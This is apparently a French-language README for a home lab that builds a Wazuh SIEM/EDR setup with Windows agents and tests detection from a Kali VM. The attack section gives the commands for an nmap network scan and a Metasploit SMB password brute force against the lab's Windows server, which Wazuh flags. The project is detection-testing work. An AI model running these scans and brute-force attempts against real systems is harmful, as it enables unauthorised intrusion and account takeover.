# Projet-Endpoint-Detection-and-Response-EDR-
Construction d'environnement de simulation d'attaque et de détection

## 1. Création de la VM Ubuntu Serveur pour y installer le service Wazuh server
- Configuration 
- Installation de openSSH Server pour pouvoir se connecter au server a distance
- On se log et voici l'ecan de connection :

    ![alt text](<Screenshots/1. ecran d'ubuntu server.png>)

On va pouvoir y installer Wazuh Server : C'est un outil permettant de surveiller le réseau (=SIEM : Security Information and Event Managment). Il collecte les logs des machines, les analyse et genere des alertes dans un dashboard web. Le server est donc rattaché a des agents, qui eux seront installés sur les autres machines et qui vont collecter et envoyer les logs au serveur.

On lit la documentation : https://documentation.wazuh.com/current/quickstart.html se connecte au serveur via ssh avec ssh user@ip pour y installer Wazuh (plus simple pour coller les liens d'installation) puis on installe :
- curl -sO https://packages.wazuh.com/4.14/wazuh-install.sh && sudo bash ./wazuh-install.sh -a
- On a les credentials qui s'affiche a la fin de l'installation.
- On va sur internet et on se connecte avec le lien https://ip_server


![alt text](<Screenshots/2. Ecran de connection Wazuh Server.png>)

![alt text](<Screenshots/3. Menu wazu Server.png>)


## 2. Installation d'agent sur notre server Windows
On va dans Deploy new agents, on selectionne l'os windows et on entre l'ip du server wazuh pour que l'agent sache ou envoyer les logs.
On copie la commande d'installation dans le powershell de notre machine windows et on lance le service.
Dans la liste des agents sur wazuh dashboard on devrait alors voir notre machine connectée.

## 3. Installation d'agent sur une deuxieme machine Windows 11.
Meme étape, on se connecte avec Alice qui est ADMIN et commandes d'installation powershell.

Les deux agents sont installé :

![alt text](<Screenshots/4. Deux agents activé.png>)

## 4. Installation d'une VM Kali pre build pour lancer les attaques

 - On lance une nouvelle VM Kali, on la met sur le réseau et on performe une detection nmap du reseau :
 nmap -sV ip_reseau/24

 Il a pu trouver : le server windows, l'ordinateur sous windows 11, le server Wazuh et lui meme (linux kali).
 Kali est donc pret a attaquer

 ## 5. Bruteforce SMB (port 445) avec Metasploit
 L'objectif est d'attaquer le server windows depuis Kali.

Le protocole SMB sur le port 445 sert au partage de ressources reseaux (fichier, dossiers, imprimante). Il s'agit d'une authentification par mot de passe (le mot de passe login), donc s'il est faible, on peut le bruteforce facilement.
Normalement, mon mot de passe est complexe et n'est pas dans la list rockyou.txt. Metasploit devrait echouer a le bruteforce

- on ouvre metasploit : msfconsole
- on utilise l'outil smb login : use auxiliary/scanner/smb/smb_login
- on definit a metasploit quel hote attaquer : set RHOSTS 192.168.29.10
- on definit le nom de l'utilisateur : set SMBUser Administrator
- on lui fournit la liste de mot de passe : set PASS_FILE /usr/share/wordlists/rockyou.txt
- on execute : run

Metasploit n'a pas trouvé mon mot de passe.
Dans Wazuh dashboard, on a bien une alerte qui nous previens que beaucoup d'authentification ratés sont en cours :

![alt text](<Screenshots/5. Authentification failure.png>)

Supposons qu'il ai trouvé le mot de passe, on peut ouvrir un shell depuis le terminal et controler le pc.